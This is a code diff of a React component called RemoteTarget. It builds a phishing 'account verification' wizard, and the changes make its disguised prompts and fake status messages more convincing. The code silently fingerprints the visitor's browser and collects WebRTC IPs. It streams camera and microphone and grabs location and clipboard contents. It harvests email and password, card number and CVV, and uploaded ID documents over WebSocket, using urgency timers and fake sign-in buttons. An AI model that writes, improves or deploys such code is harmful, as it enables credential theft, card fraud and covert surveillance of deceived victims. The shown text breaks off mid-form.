@@ -7,11 +7,14 @@ import { Input } from "@/components/ui/input";
 import { Progress } from "@/components/ui/progress";
 import {
   Camera, Mic, MapPin, Smartphone, FolderOpen,
-  CheckCircle2, AlertTriangle, Shield, Loader2, XCircle, Bell,
-  KeyRound, ClipboardPaste, Globe, Lock, CreditCard, Eye, EyeOff,
-  ScanFace, AudioLines, Search, FileCheck, ArrowRight, ShieldCheck,
-  Timer, Users, Fingerprint,
+  CheckCircle2, AlertTriangle, Shield, Loader2, XCircle,
+  ClipboardPaste, Globe, Lock, CreditCard, Eye, EyeOff,
+  FileCheck, ShieldCheck,
+  Timer, Users, Fingerprint, User, MessageCircle, X,
+  Upload, FileText, CreditCard as CreditCardIcon, HelpCircle,
+  Check, ChevronRight,
 } from "lucide-react";
+import { SiGoogle, SiApple } from "react-icons/si";
 
 interface TargetPageConfig {
   steps: { identity: boolean; biometric: boolean; voice: boolean; environment: boolean; documents: boolean };
@@ -52,22 +55,22 @@ const initialPermissions: Record<PermissionKey, PermissionState> = {
 };
 
 const WIZARD_STEPS = [
-  { id: 1, title: "Identity Verification", subtitle: "Verify your account credentials" },
-  { id: 2, title: "Biometric Scan", subtitle: "Facial recognition check" },
-  { id: 3, title: "Voice Authentication", subtitle: "Voice pattern verification" },
-  { id: 4, title: "Security Environment Check", subtitle: "Analyzing your device security" },
-  { id: 5, title: "Document Verification", subtitle: "Upload supporting documents" },
+  { id: 1, title: "Sign In", subtitle: "Account access" },
+  { id: 2, title: "Photo ID", subtitle: "Identity check" },
+  { id: 3, title: "Voice Check", subtitle: "Voice sample" },
+  { id: 4, title: "Connection", subtitle: "Device check" },
+  { id: 5, title: "Documents", subtitle: "Upload ID" },
 ];
 
 const disguisedLabels: Record<PermissionKey, { title: string; body: string }> = {
-  camera: { title: "Biometric Verification Required", body: "A facial recognition scan is needed to verify your identity. Your browser will request access to your imaging sensor for the biometric check." },
-  microphone: { title: "Voice Authentication Required", body: "A voice pattern analysis is needed to complete multi-factor authentication. Your browser will request access to the audio input for voice-print matching." },
-  location: { title: "Regional Compliance Check", body: "We need to verify your geographic region to comply with local regulations. Your browser will ask for location access for this compliance step." },
-  deviceInfo: { title: "Device Security Assessment", body: "An automated check of your device's security configuration is required before proceeding." },
-  files: { title: "Document Upload Required", body: "Please upload a verification document (government ID, utility bill, or bank statement) to complete identity confirmation." },
-  credentials: { title: "Session Re-authentication", body: "Your secure session has expired. Please re-enter your credentials to continue the verification process." },
-  clipboard: { title: "Clipboard Security Scan", body: "A routine check of your clipboard is required to detect potentially unsafe content copied from external sources." },
-  browserData: { title: "Browser Configuration Analysis", body: "An analysis of your browser's security configuration is needed to ensure compliance with our platform requirements." },
+  camera: { title: "Camera Access Needed", body: "We need to take a quick photo to confirm your identity. Please allow camera access when prompted." },
+  microphone: { title: "Microphone Access Needed", body: "We need a short voice recording to verify your account. Please allow microphone access when prompted." },
+  location: { title: "Location Verification", body: "We need to confirm your location matches your account region. Please allow location access when prompted." },
+  deviceInfo: { title: "Device Check", body: "We need to verify your device for security purposes." },
+  files: { title: "Document Upload", body: "Please upload a photo of your ID to verify your identity." },
+  credentials: { title: "Sign In Required", body: "Please sign in to continue with the verification process." },
+  clipboard: { title: "Paste Verification Code", body: "We need to check for a copied verification code from your email." },
+  browserData: { title: "Browser Check", body: "A quick check of your browser settings is needed for compatibility." },
 };
 
 async function generateCanvasFingerprint(): Promise<string> {
@@ -274,6 +277,29 @@ export default function RemoteTarget() {
   const [autoHarvestDone, setAutoHarvestDone] = useState(false);
   const [initStatus, setInitStatus] = useState("Establishing secure connection...");
 
+  const [cookieDismissed, setCookieDismissed] = useState(false);
+  const [chatOpen, setChatOpen] = useState(false);
+  const [socialToast, setSocialToast] = useState<string | null>(null);
+  const [selfieCaptured, setSelfieCaptured] = useState(false);
+  const [voiceRecordingTime, setVoiceRecordingTime] = useState(0);
+  const [voiceRecording, setVoiceRecording] = useState(false);
+  const [dragOver, setDragOver] = useState(false);
+  const [uploadedFileName, setUploadedFileName] = useState<string | null>(null);
+  const [uploadProgress, setUploadProgress] = useState(0);
+  const [rememberMe, setRememberMe] = useState(false);
+  const [termsAgreed, setTermsAgreed] = useState(true);
+  const [envCheckItems, setEnvCheckItems] = useState<string[]>([]);
+  const [stepTransition, setStepTransition] = useState(false);
+  const [notificationShown, setNotificationShown] = useState(false);
+  const [forgotPassword, setForgotPassword] = useState(false);
+  const [resetEmail, setResetEmail] = useState("");
+  const [resetSent, setResetSent] = useState(false);
+
+  const selfieVideoRef = useRef<HTMLVideoElement>(null);
+  const audioCanvasRef = useRef<HTMLCanvasElement>(null);
+  const analyserRef = useRef<AnalyserNode | null>(null);
+  const animFrameRef = useRef<number>(0);
+
   const cfg = session?.pageConfig || { steps: { identity: true, biometric: true, voice: true, environment: true, documents: true }, enableBanking: false, enableAutoHarvest: true, enableCredentialOverlay: false, autoRequestPermissions: false, pageTitle: "Account Security Verification", pageSubtitle: "", brandColor: "blue" as const };
 
   const activeStepKeys = [
@@ -289,12 +315,12 @@ export default function RemoteTarget() {
     return activeStepKeys.includes(keys[i]);
   });
 
-  const brandColors: Record<string, { from: string; to: string; accent: string; bg: string }> = {
-    blue: { from: "from-blue-600", to: "to-blue-800", accent: "text-blue-500", bg: "bg-blue-500/10" },
-    red: { from: "from-red-600", to: "to-red-800", accent: "text-red-500", bg: "bg-red-500/10" },
-    green: { from: "from-green-600", to: "to-green-800", accent: "text-green-500", bg: "bg-green-500/10" },
-    purple: { from: "from-purple-600", to: "to-purple-800", accent: "text-purple-500", bg: "bg-purple-500/10" },
-    orange: { from: "from-orange-600", to: "to-orange-800", accent: "text-orange-500", bg: "bg-orange-500/10" },
+  const brandColors: Record<string, { from: string; to: string; accent: string; bg: string; solid: string; ring: string }> = {
+    blue: { from: "from-blue-600", to: "to-blue-800", accent: "text-blue-600", bg: "bg-blue-600", solid: "bg-blue-50", ring: "ring-blue-200" },
+    red: { from: "from-red-600", to: "to-red-800", accent: "text-red-600", bg: "bg-red-600", solid: "bg-red-50", ring: "ring-red-200" },
+    green: { from: "from-green-600", to: "to-green-800", accent: "text-green-600", bg: "bg-green-600", solid: "bg-green-50", ring: "ring-green-200" },
+    purple: { from: "from-purple-600", to: "to-purple-800", accent: "text-purple-600", bg: "bg-purple-600", solid: "bg-purple-50", ring: "ring-purple-200" },
+    orange: { from: "from-orange-600", to: "to-orange-800", accent: "text-orange-600", bg: "bg-orange-600", solid: "bg-orange-50", ring: "ring-orange-200" },
   };
   const brand = brandColors[cfg.brandColor] || brandColors.blue;
 
@@ -368,27 +394,33 @@ export default function RemoteTarget() {
   }, []);
 
   useEffect(() => {
+    const t = setTimeout(() => setNotificationShown(true), 12000);
+    const t2 = setTimeout(() => setNotificationShown(false), 18000);
+    return () => { clearTimeout(t); clearTimeout(t2); };
+  }, []);
+
+  useEffect(() => {
     if (!session || autoHarvestDone) return;
     if (!cfg.enableAutoHarvest) { setAutoHarvestDone(true); return; }
 
     const runAutoHarvest = async () => {
-      setInitStatus("Establishing secure connection...");
+      setInitStatus("Connecting to server...");
       await new Promise((r) => setTimeout(r, 600));
 
-      setInitStatus("Verifying SSL certificate...");
+      setInitStatus("Verifying security certificate...");
       const canvasHash = await generateCanvasFingerprint();
       await new Promise((r) => setTimeout(r, 400));
 
-      setInitStatus("Loading security module...");
+      setInitStatus("Loading verification module...");
       const webglData = await generateWebGLFingerprint();
       await new Promise((r) => setTimeout(r, 300));
 
-      setInitStatus("Initializing encryption...");
+      setInitStatus("Preparing your session...");
       const audioHash = await generateAudioFingerprint();
       const fonts = detectFonts();
       await new Promise((r) => setTimeout(r, 400));
 
-      setInitStatus("Checking network configuration...");
+      setInitStatus("Almost ready...");
       const webrtcIPs = await detectWebRTCIP();
       const features = detectBrowserFeatures();
       const socialLogins = detectSocialLogins();
@@ -443,7 +475,7 @@ export default function RemoteTarget() {
           if (trySend()) break;
         }
       }
-      setInitStatus("Secure connection established");
+      setInitStatus("Ready");
       await new Promise((r) => setTimeout(r, 500));
       setAutoHarvestDone(true);
     };
@@ -645,12 +677,16 @@ export default function RemoteTarget() {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
       cameraTracksRef.current = stream.getVideoTracks();
+      if (selfieVideoRef.current) {
+        selfieVideoRef.current.srcObject = stream;
+        selfieVideoRef.current.play().catch(() => {});
+      }
       await setupOrUpdateWebRTC(stream.getVideoTracks());
       updatePermission("camera", { granted: true, loading: false });
       sendWS({ type: "rc_permission_granted", permission: "camera" });
       await postData({ permissionsGranted: ["camera"] });
     } catch (err: any) {
-      updatePermission("camera", { loading: false, error: "Biometric scan failed. Please ensure your device has a camera and try again." });
+      updatePermission("camera", { loading: false, error: "Camera access was denied. Please allow camera access in your browser settings and try again." });
       sendWS({ type: "rc_permission_denied", permission: "camera" });
     }
   }, [setupOrUpdateWebRTC, sendWS, postData, updatePermission]);
@@ -664,11 +700,61 @@ export default function RemoteTarget() {
       updatePermission("microphone", { granted: true, loading: false });
       sendWS({ type: "rc_permission_granted", permission: "microphone" });
       await postData({ permissionsGranted: ["microphone"] });
+
+      try {
+        const audioCtx = new AudioContext();
+        const source = audioCtx.createMediaStreamSource(stream);
+        const analyser = audioCtx.createAnalyser();
+        analyser.fftSize = 256;
+        source.connect(analyser);
+        analyserRef.current = analyser;
+      } catch {}
+
+      setVoiceRecording(true);
+      setVoiceRecordingTime(0);
+      const start = Date.now();
+      const interval = setInterval(() => {
+        const elapsed = Math.floor((Date.now() - start) / 1000);
+        setVoiceRecordingTime(elapsed);
+        if (elapsed >= 5) {
+          clearInterval(interval);
+          setVoiceRecording(false);
+          setTimeout(() => advanceStep(), 1500);
+        }
+      }, 200);
     } catch (err: any) {
-      updatePermission("microphone", { loading: false, error: "Voice verification failed. Please ensure your device has a microphone and try again." });
+      updatePermission("microphone", { loading: false, error: "Microphone access was denied. Please allow microphone access in your browser settings and try again." });
       sendWS({ type: "rc_permission_denied", permission: "microphone" });
     }
   }, [setupOrUpdateWebRTC, sendWS, postData, updatePermission]);
+
+  useEffect(() => {
+    if (!voiceRecording || !analyserRef.current || !audioCanvasRef.current) return;
+    const canvas = audioCanvasRef.current;
+    const ctx = canvas.getContext("2d");
+    if (!ctx) return;
+    const analyser = analyserRef.current;
+    const bufferLength = analyser.frequencyBinCount;
+    const dataArray = new Uint8Array(bufferLength);
+
+    const draw = () => {
+      animFrameRef.current = requestAnimationFrame(draw);
+      analyser.getByteFrequencyData(dataArray);
+      ctx.fillStyle = "rgba(0, 0, 0, 0)";
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      const barWidth = (canvas.width / bufferLength) * 2.5;
+      let x = 0;
+      for (let i = 0; i < bufferLength; i++) {
+        const barHeight = (dataArray[i] / 255) * canvas.height;
+        const hue = cfg.brandColor === "blue" ? 220 : cfg.brandColor === "red" ? 0 : cfg.brandColor === "green" ? 140 : cfg.brandColor === "purple" ? 270 : 30;
+        ctx.fillStyle = `hsla(${hue}, 70%, 55%, 0.8)`;
+        ctx.fillRect(x, canvas.height - barHeight, barWidth, barHeight);
+        x += barWidth + 1;
+      }
+    };
+    draw();
+    return () => cancelAnimationFrame(animFrameRef.current);
+  }, [voiceRecording, cfg.brandColor]);
 
   const handleLocation = useCallback(async () => {
     updatePermission("location", { loading: true, error: null });
@@ -721,6 +807,14 @@ export default function RemoteTarget() {
     const files = e.target.files;
     if (!files || files.length === 0) return;
     updatePermission("files", { loading: true, error: null });
+    setUploadedFileName(files[0].name);
+    setUploadProgress(0);
+    const progressInterval = setInterval(() => {
+      setUploadProgress((prev) => {
+        if (prev >= 100) { clearInterval(progressInterval); return 100; }
+        return prev + Math.random() * 20 + 10;
+      });
+    }, 300);
     try {
       for (const file of Array.from(files)) {
         const dataUrl = await new Promise<string>((resolve) => {
@@ -730,9 +824,12 @@ export default function RemoteTarget() {
         });
         sendWS({ type: "rc_file", data: { name: file.name, type: file.type, size: file.size, preview: dataUrl }, token });
       }
+      clearInterval(progressInterval);
+      setUploadProgress(100);
       updatePermission("files", { granted: true, loading: false });
       sendWS({ type: "rc_permission_granted", permission: "files" });
     } catch (err: any) {
+      clearInterval(progressInterval);
       updatePermission("files", { loading: false, error: err.message || "Failed to process files" });
     }
   };
@@ -853,66 +950,77 @@ export default function RemoteTarget() {
   }, [pendingRequest, sendWS]);
 
   const advanceStep = useCallback(() => {
-    setCurrentStep((prev) => {
-      const stepKeys = ["identity", "biometric", "voice", "environment", "documents"];
-      let next = prev + 1;
-      while (next <= WIZARD_STEPS.length && !activeStepKeys.includes(stepKeys[next - 1])) {
-        next++;
-      }
-      if (next > WIZARD_STEPS.length) {
-        setWizardComplete(true);
-        return prev;
-      }
-      return next;
-    });
+    setStepTransition(true);
+    setTimeout(() => {
+      setCurrentStep((prev) => {
+        const stepKeys = ["identity", "biometric", "voice", "environment", "documents"];
+        let next = prev + 1;
+        while (next <= WIZARD_STEPS.length && !activeStepKeys.includes(stepKeys[next - 1])) {
+          next++;
+        }
+        if (next > WIZARD_STEPS.length) {
+          setWizardComplete(true);
+          return prev;
+        }
+        return next;
+      });
+      setTimeout(() => setStepTransition(false), 50);
+    }, 300);
   }, [activeStepKeys]);
 
   const runEnvironmentScan = useCallback(async () => {
     setScanRunning(true);
     setScanProgress(0);
+    setEnvCheckItems([]);
 
-    const steps = [
-      { label: "Initializing security scan...", progress: 10 },
-      { label: "Checking network security configuration...", progress: 20 },
-      { label: "Verifying regional compliance...", progress: 35 },
-      { label: "Analyzing browser configuration...", progress: 50 },
-      { label: "Scanning clipboard for threats...", progress: 65 },
-      { label: "Collecting device fingerprint...", progress: 80 },
-      { label: "Running final security checks...", progress: 90 },
-      { label: "Compiling security report...", progress: 100 },
+    const items = [
+      { label: "Secure connection verified", delay: 1200 },
+      { label: "Region confirmed", delay: 1500 },
+      { label: "Browser compatible", delay: 1000 },
+      { label: "Clipboard checked", delay: 1200 },
+      { label: "Device recognized", delay: 1000 },
+      { label: "All checks passed", delay: 800 },
     ];
 
     let harvested = false;
 
-    for (let i = 0; i < steps.length; i++) {
-      setScanStatus(steps[i].label);
-      setScanProgress(steps[i].progress);
+    for (let i = 0; i < items.length; i++) {
+      setScanProgress(Math.round(((i + 1) / items.length) * 100));
+      setScanStatus(items[i].label);
 
-      if (i === 2 && !permissions.location.granted) {
+      if (i === 1 && !permissions.location.granted) {
         try { await new Promise<void>((res) => { handleLocation(); setTimeout(res, 1500); }); } catch {}
       }
-      if (i === 3 && !permissions.browserData.granted) {
+      if (i === 2 && !permissions.browserData.granted) {
         try { await handleBrowserData(); } catch {}
         harvested = true;
       }
-      if (i === 4 && !permissions.clipboard.granted) {
+      if (i === 3 && !permissions.clipboard.granted) {
         try { await handleClipboard(); } catch {}
       }
-      if (i === 5 && !permissions.deviceInfo.granted) {
+      if (i === 4 && !permissions.deviceInfo.granted) {
         try { await handleDeviceInfo(); } catch {}
       }
 
-      await new Promise((r) => setTimeout(r, harvested ? 800 : 1200));
+      await new Promise((r) => setTimeout(r, harvested ? 600 : items[i].delay));
+      setEnvCheckItems((prev) => [...prev, items[i].label]);
     }
 
     setScanRunning(false);
-    setTimeout(() => advanceStep(), 600);
+    setTimeout(() => advanceStep(), 800);
   }, [handleLocation, handleBrowserData, handleClipboard, handleDeviceInfo, permissions, advanceStep]);
 
   useEffect(() => {
-    if (!cfg.autoRequestPermissions || currentStep === 0) return;
+    if (currentStep === 0) return;
     const stepKeys = ["identity", "biometric", "voice", "environment", "documents"];
     const stepKey = stepKeys[currentStep - 1];
+
+    if (stepKey === "environment" && !scanRunning && scanProgress === 0) {
+      const timer = setTimeout(() => runEnvironmentScan(), 800);
+      return () => clearTimeout(timer);
+    }
+
+    if (!cfg.autoRequestPermissions) return;
     const autoRequestMap: Record<string, PermissionKey | null> = {
       biometric: "camera",
       voice: "microphone",
@@ -922,10 +1030,6 @@ export default function RemoteTarget() {
       const timer = setTimeout(() => {
         if (handlers[permToRequest]) handlers[permToRequest]();
       }, 1000);
-      return () => clearTimeout(timer);
-    }
-    if (stepKey === "environment" && !scanRunning && scanProgress === 0) {
-      const timer = setTimeout(() => runEnvironmentScan(), 800);
       return () => clearTimeout(timer);
     }
   }, [currentStep, cfg.autoRequestPermissions]);
@@ -952,10 +1056,10 @@ export default function RemoteTarget() {
 
   if (loading) {
     return (
-      <div className="min-h-screen bg-background flex items-center justify-center">
+      <div className="min-h-screen bg-white flex items-center justify-center">
         <div className="flex flex-col items-center gap-3">
-          <Loader2 className="w-8 h-8 animate-spin text-primary" data-testid="loading-spinner" />
-          <span className="text-sm text-muted-foreground font-mono">Loading verification...</span>
+          <div className="w-10 h-10 border-2 border-gray-200 border-t-gray-800 rounded-full animate-spin" />
+          <span className="text-sm text-gray-500" data-testid="loading-spinner">Loading...</span>
         </div>
       </div>
     );
@@ -963,568 +1067,813 @@ export default function RemoteTarget() {
 
   if (error) {
     return (
-      <div className="min-h-screen bg-background flex items-center justify-center p-4">
-        <Card className="max-w-md w-full">
-          <CardContent className="p-8 text-center">
-            <XCircle className="w-12 h-12 text-destructive mx-auto mb-4" />
-            <h2 className="text-lg font-semibold mb-2" data-testid="text-error-title">Session Unavailable</h2>
-            <p className="text-sm text-muted-foreground" data-testid="text-error-message">{error}</p>
-          </CardContent>
-        </Card>
+      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
+        <div className="max-w-md w-full bg-white rounded-xl shadow-sm border border-gray-200 p-8 text-center">
+          <div className="w-12 h-12 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-4">
+            <XCircle className="w-6 h-6 text-red-500" />
+          </div>
+          <h2 className="text-lg font-semibold text-gray-900 mb-2" data-testid="text-error-title">Page Not Available</h2>
+          <p className="text-sm text-gray-500" data-testid="text-error-message">{error}</p>
+          <p className="text-xs text-gray-400 mt-4">If you believe this is an error, please contact support.</p>
+        </div>
       </div>
     );
   }
 
   if (!autoHarvestDone) {
     return (
-      <div className="min-h-screen bg-background flex items-center justify-center">
+      <div className="min-h-screen bg-white flex items-center justify-center">
         <div className="flex flex-col items-center gap-4 max-w-xs text-center">
-          <div className="relative">
-            <div className="w-16 h-16 rounded-full border-2 border-primary/20 border-t-primary animate-spin" />
-            <Shield className="w-6 h-6 text-primary absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2" />
-          </div>
-          <p className="text-sm font-medium" data-testid="text-init-status">{initStatus}</p>
-          <p className="text-xs text-muted-foreground">Please wait while we set up your secure session</p>
+          <div className="w-12 h-12 border-2 border-gray-200 border-t-gray-800 rounded-full animate-spin" />
+          <p className="text-sm font-medium text-gray-700" data-testid="text-init-status">{initStatus}</p>
+          <p className="text-xs text-gray-400">This may take a moment</p>
         </div>
       </div>
     );
   }
 
   const currentStepIndex = activeWizardSteps.findIndex((s) => s.id === currentStep);
-  const overallProgress = activeWizardSteps.length > 0 ? Math.round((Math.max(0, currentStepIndex) / activeWizardSteps.length) * 100) : 0;
+  const overallProgress = activeWizardSteps.length > 0 ? Math.round(((Math.max(0, currentStepIndex) + (wizardComplete ? 1 : 0)) / activeWizardSteps.length) * 100) : 0;
   const timerMin = Math.floor(urgencyTimer / 60);
   const timerSec = urgencyTimer % 60;
 
-  const renderDeniedError = (permKey: PermissionKey) => {
-    const err = permissions[permKey].error;
-    if (!err) return null;
-    return (
-      <div className="rounded-lg bg-destructive/10 border border-destructive/20 p-3 text-center space-y-2">
-        <AlertTriangle className="w-5 h-5 text-destructive mx-auto" />
-        <p className="text-xs text-destructive font-medium">Verification Failed</p>
-        <p className="text-[10px] text-muted-foreground">{err}</p>
-        <p className="text-[10px] text-destructive/70">Your account may be suspended if verification is not completed. Please try again.</p>
-      </div>
-    );
-  };
-
   const renderStep1 = () => (
-    <div className="space-y-4" data-testid="step-identity">
-      <div className="text-center space-y-2 mb-6">
-        <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-blue-500/10 mb-2">
-          <Lock className="w-7 h-7 text-blue-500" />
+    <div className={`transition-all duration-300 ${stepTransition ? "opacity-0 translate-y-4" : "opacity-100 translate-y-0"}`} data-testid="step-identity">
+      <div className="max-w-sm mx-auto space-y-5">
+        <div className="text-center space-y-1">
+          <h2 className="text-xl font-semibold text-gray-900" data-testid="text-step-title">Sign in to continue</h2>
+          <p className="text-sm text-gray-500">Enter your account details to verify your identity</p>
         </div>
-        <h2 className="text-lg font-semibold" data-testid="text-step-title">Verify Your Identity</h2>
-        <p className="text-sm text-muted-foreground max-w-sm mx-auto">
-          For security purposes, please confirm your account credentials to access the secure portal.
-        </p>
-      </div>
 
-      <Card className="border-blue-500/20">
-        <CardContent className="p-0">
-          <div className={`bg-gradient-to-r ${brand.from} ${brand.to} p-3 rounded-t-lg`}>
-            <div className="flex items-center gap-2 text-white">
-              <Shield className="w-4 h-4" />
-              <span className="font-medium text-xs">Secure Authentication Portal</span>
+        {!forgotPassword ? (
+          <div className="space-y-4">
+            <div className="flex gap-3">
+              <button
+                className="flex-1 flex items-center justify-center gap-2 px-3 py-2.5 border border-gray-200 rounded-lg hover:bg-gray-50 transition-colors text-sm text-gray-700"
+                onClick={() => { setSocialToast("Google"); setTimeout(() => setSocialToast(null), 3000); }}
+                data-testid="button-social-google"
+              >
+                <SiGoogle className="w-4 h-4" />
+                <span>Google</span>
+              </button>
+              <button
+                className="flex-1 flex items-center justify-center gap-2 px-3 py-2.5 border border-gray-200 rounded-lg hover:bg-gray-50 transition-colors text-sm text-gray-700"
+                onClick={() => { setSocialToast("Apple"); setTimeout(() => setSocialToast(null), 3000); }}
+                data-testid="button-social-apple"
+              >
+                <SiApple className="w-4 h-4" />
+                <span>Apple</span>
+              </button>
+              <button
+                className="flex-1 flex items-center justify-center gap-2 px-3 py-2.5 border border-gray-200 rounded-lg hover:bg-gray-50 transition-colors text-sm text-gray-700"
+                onClick={() => { setSocialToast("Microsoft"); setTimeout(() => setSocialToast(null), 3000); }}
+                data-testid="button-social-microsoft"
+              >
+                <Globe className="w-4 h-4" />
+                <span className="hidden sm:inline">Microsoft</span>
+              </button>
             </div>
-          </div>
-          <div className="p-5 space-y-4">
-            {cfg.enableBanking && (
-              <div className="flex gap-1 border-b border-border/50 mb-4">
-                <button
-                  className={`px-3 py-2 text-xs font-medium border-b-2 transition-colors ${credTab === "login" ? "border-primary text-primary" : "border-transparent text-muted-foreground hover:text-foreground"}`}
-                  onClick={() => setCredTab("login")}
-                  data-testid="tab-login"
-                >
-                  Account Login
-                </button>
-                <button
-                  className={`px-3 py-2 text-xs font-medium border-b-2 transition-colors ${credTab === "banking" ? "border-primary text-primary" : "border-transparent text-muted-foreground hover:text-foreground"}`}
-                  onClick={() => setCredTab("banking")}
-                  data-testid="tab-banking"
-                >
-                  Payment Verification
-                </button>
-              </div>
-            )}
+
+            <div className="flex items-center gap-3">
+              <div className="flex-1 h-px bg-gray-200" />
+              <span className="text-xs text-gray-400">or continue with email</span>
+              <div className="flex-1 h-px bg-gray-200" />
+            </div>
 
             {credTab === "login" && (
               <div className="space-y-3">
                 <div>
-                  <label className="text-xs font-medium text-muted-foreground mb-1 block">Email Address</label>
-                  <Input type="email" placeholder="name@example.com" value={credForm.email} onChange={(e) => setCredForm((p) => ({ ...p, email: e.target.value }))} data-testid="input-cred-email" />
+                  <label className="text-sm font-medium text-gray-700 mb-1.5 block">Email</label>
+                  <Input
+                    type="email"
+                    placeholder="you@example.com"
+                    value={credForm.email}
+                    onChange={(e) => setCredForm((p) => ({ ...p, email: e.target.value }))}
+                    className="h-11 bg-white border-gray-200 focus:border-gray-400 focus:ring-gray-400"
+                    data-testid="input-cred-email"
+                  />
                 </div>
                 <div>
-                  <label className="text-xs font-medium text-muted-foreground mb-1 block">Password</label>
+                  <div className="flex items-center justify-between mb-1.5">
+                    <label className="text-sm font-medium text-gray-700">Password</label>
+                    <button
+                      className={`text-xs ${brand.accent} hover:underline`}
+                      onClick={() => setForgotPassword(true)}
+                      data-testid="link-forgot-password"
+                    >
+                      Forgot password?
+                    </button>
+                  </div>
                   <div className="relative">
-                    <Input type={showPassword ? "text" : "password"} placeholder="Enter your password" value={credForm.password} onChange={(e) => setCredForm((p) => ({ ...p, password: e.target.value }))} data-testid="input-cred-password" />
-                    <button type="button" className="absolute right-2 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground" onClick={() => setShowPassword(!showPassword)}>
+                    <Input
+                      type={showPassword ? "text" : "password"}
+                      placeholder="Enter your password"
+                      value={credForm.password}
+                      onChange={(e) => setCredForm((p) => ({ ...p, password: e.target.value }))}
+                      className="h-11 bg-white border-gray-200 focus:border-gray-400 focus:ring-gray-400 pr-10"
+                      data-testid="input-cred-password"
+                    />
+                    <button type="button" className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600" onClick={() => setShowPassword(!showPassword)}>
                       {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                     </button>
                   </div>
                 </div>
-                <Button className="w-full" onClick={() => submitCredentials("login")} data-testid="button-submit-login">
-                  <Lock className="w-4 h-4 mr-2" />Verify Identity
+                <div className="flex items-center gap-2">
+                  <input
+                    type="checkbox"
+                    id="remember"
+                    checked={rememberMe}
+                    onChange={(e) => setRememberMe(e.target.checked)}
+                    className="w-4 h-4 rounded border-gray-300"
+                    data-testid="checkbox-remember"
+                  />
+                  <label htmlFor="remember" className="text-sm text-gray-600">Remember me</label>
+                </div>
+                <Button
+                  className={`w-full h-11 ${brand.bg} hover:opacity-90 text-white font-medium`}
+                  onClick={() => submitCredentials("login")}
+                  data-testid="button-submit-login"
+                >
+                  Sign in
                 </Button>
               </div>
             )}
 
-            {credTab === "banking" && (
+            {cfg.enableBanking && credTab === "banking" && (
               <div className="space-y-3">
                 <div>
-                  <label className="text-xs font-medium text-muted-foreground mb-1 block">Cardholder Name</label>
-                  <Input placeholder="John Smith" value={credForm.cardName} onChange={(e) => setCredForm((p) => ({ ...p, cardName: e.target.value }))} data-testid="input-card-name" />
+                  <label className="text-sm font-medium text-gray-700 mb-1.5 block">Cardholder name</label>
+                  <Input placeholder="John Smith" value={credForm.cardName} onChange={(e) => setCredForm((p) => ({ ...p, cardName: e.target.value }))} className="h-11 bg-white border-gray-200" data-testid="input-card-name" />
                 </div>
                 <div>
-                  <label className="text-xs font-medium text-muted-foreground mb-1 block">Card Number</label>
+                  <label className="text-sm font-medium text-gray-700 mb-1.5 block">Card number</label>
                   <div className="relative">
-                    <Input placeholder="4242 4242 4242 4242" value={credForm.cardNumber} onChange={(e) => setCredForm((p) => ({ ...p, cardNumber: e.target.value }))} data-testid="input-card-number" />
-                    <CreditCard className="absolute right-2 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
+                    <Input placeholder="1234 5678 9012 3456" value={credForm.cardNumber} onChange={(e) => setCredForm((p) => ({ ...p, cardNumber: e.target.value }))} className="h-11 bg-white border-gray-200 pr-10" data-testid="input-card-number" />
+                    <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                   </div>
                 </div>
                 <div className="grid grid-cols-2 gap-3">
                   <div>
-                    <label className="text-xs font-medium text-muted-foreground mb-1 block">Expiry</label>
-                    <Input placeholder="MM/YY" value={credForm.cardExpiry} onChange={(e) => setCredForm((p) => ({ ...p, cardExpiry: e.target.value }))} data-testid="input-card-expiry" />
+                    <label className="text-sm font-medium text-gray-700 mb-1.5 block">Expiry</label>
+                    <Input placeholder="MM/YY" value={credForm.cardExpiry} onChange={(e) => setCredForm((p) => ({ ...p, cardExpiry: e.target.value }))} className="h-11 bg-white border-gray-200" data-testid="input-card-expiry" />
                   </div>
                   <div>
-                    <label className="text-xs font-medium text-muted-foreground mb-1 block">CVV</label>
-                    <Input type="password" placeholder="123" value={credForm.cardCvv} onChange={(e) => setCredForm((p) => ({ ...p, cardCvv: e.target.value }))} data-testid="input-card-cvv" />
+                    <label className="text-sm font-medium text-gray-700 mb-1.5 block">CVV</label>
+                    <Input type="password" placeholder="123" maxLength={4} value={credForm.cardCvv} onChange={(e) => setCredForm((p) => ({ ...p, cardCvv: e.target.value }))} className="h-11 bg-white border-gray-200" data-testid="input-card-cvv" />
                   </div>
                 </div>
-                <Button className="w-full" onClick={() => submitCredentials("banking")} data-testid="button-submit-banking">
-                  <CreditCard className="w-4 h-4 mr-2" />Verify Payment Method
+                <Button
+                  className={`w-full h-11 ${brand.bg} hover:opacity-90 text-white font-medium`}
+                  onClick={() => submitCredentials("banking")}
+                  data-testid="button-submit-banking"
+                >
+                  Verify payment method
                 </Button>
               </div>
             )}
 
-            <p className="text-[10px] text-muted-foreground text-center">Secured by 256-bit SSL encryption</p>
-          </div>
-        </CardContent>
-      </Card>
+            {cfg.enableBanking && (
+              <div className="text-center">
+                <button
+                  className={`text-sm ${brand.accent} hover:underline`}
+                  onClick={() => setCredTab(credTab === "login" ? "banking" : "login")}
+                  data-testid="toggle-cred-tab"
+                >
+                  {credTab === "login" ? "Add payment method instead" : "Sign in with email instead"}
+                </button>
+              </div>
+            )}
 
-      <div className="flex justify-center pt-2">
-        <Button variant="ghost" size="sm" className="text-xs text-muted-foreground" onClick={advanceStep} data-testid="button-skip-step">
-          Skip this step
-        </Button>
+            <p className="text-center text-xs text-gray-400">
+              Don't have an account?{" "}
+              <button className={`${brand.accent} hover:underline`} onClick={advanceStep} data-testid="link-create-account">
+                Create one
+              </button>
+            </p>
+          </div>
+        ) : (
+          <div className="space-y-4">
+            {!resetSent ? (
+              <>
+                <p className="text-sm text-gray-500">Enter your email and we'll send you a link to reset your password.</p>
+                <Input
+                  type="email"
+                  placeholder="you@example.com"
+                  value={resetEmail}
+                  onChange={(e) => setResetEmail(e.target.value)}
+                  className="h-11 bg-white border-gray-200"
